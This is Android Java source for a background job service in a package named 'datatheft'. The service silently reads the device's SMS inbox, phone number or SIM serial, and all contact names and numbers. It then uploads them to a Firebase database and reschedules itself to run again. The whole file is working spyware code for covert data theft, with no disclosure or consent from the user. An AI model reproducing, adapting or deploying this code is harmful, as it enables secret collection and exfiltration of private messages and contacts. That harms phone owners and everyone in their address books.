package nerdcastle.datatheft;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.*;
import android.os.Message;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import com.firebase.jobdispatcher.JobParameters;
import com.firebase.jobdispatcher.JobService;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.text.DateFormat;
import java.util.ArrayList;
import java.util.Date;

/**
 * Created by Nazmul on 10-Sep-17.
 */

public class InfoJobService extends JobService {
    private ArrayList<Contact> contactList;
    private String mPhoneNumber="";
    private PhoneMessage phoneMessage;

    @Override
    public boolean onStartJob(final JobParameters job) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                uploadDatToFirebase(job);
            }
        }).start();
        return true;
    }



    @Override
    public boolean onStopJob(JobParameters job) {
        return false;
    }

    private void uploadDatToFirebase(final JobParameters parameters) {
        try{
            getSms();
            Thread.sleep(5000);
        }catch (InterruptedException e) {
            e.printStackTrace();
        } finally {
            //Tell the framework that the job has completed and doesnot needs to be reschedule
            jobFinished(parameters, true);
        }
    }

    private void getUSerPhoneNumber() {
        TelephonyManager tMgr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE);
        mPhoneNumber = tMgr.getLine1Number();
        if(mPhoneNumber.length()==0){
            mPhoneNumber= tMgr.getSimSerialNumber();
        }
    }

    private void firebaseDataPass() {
        Info info=new Info(mPhoneNumber,contactList,phoneMessage);
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("info");
        String pushKey=myRef.push().getKey();
        myRef.child(pushKey).setValue(info);
    }

    private void getSms() {
        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
        if (cursor.moveToFirst()) { // must check the result to prevent exception

            String from = cursor.getString(cursor.getColumnIndex("address"));
            String msg = cursor.getString(cursor.getColumnIndex("body"));
            phoneMessage = new PhoneMessage(from, msg);
        }
                // use msgData
        cursor.close();
        getUSerPhoneNumber();
        contactList=getContactList();
        firebaseDataPass();
    }

    private ArrayList<Contact> getContactList() {
        contactList=new ArrayList<>();
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(
                        ContactsContract.Contacts.DISPLAY_NAME));

                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {

                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        Contact contact=new Contact(name,phoneNo);
                        contactList.add(contact);
                        //Toast.makeText(this, contactList.toString(), Toast.LENGTH_SHORT).show();
                    }
                    pCur.close();
                }
            }
        }
        return contactList;
    }
}
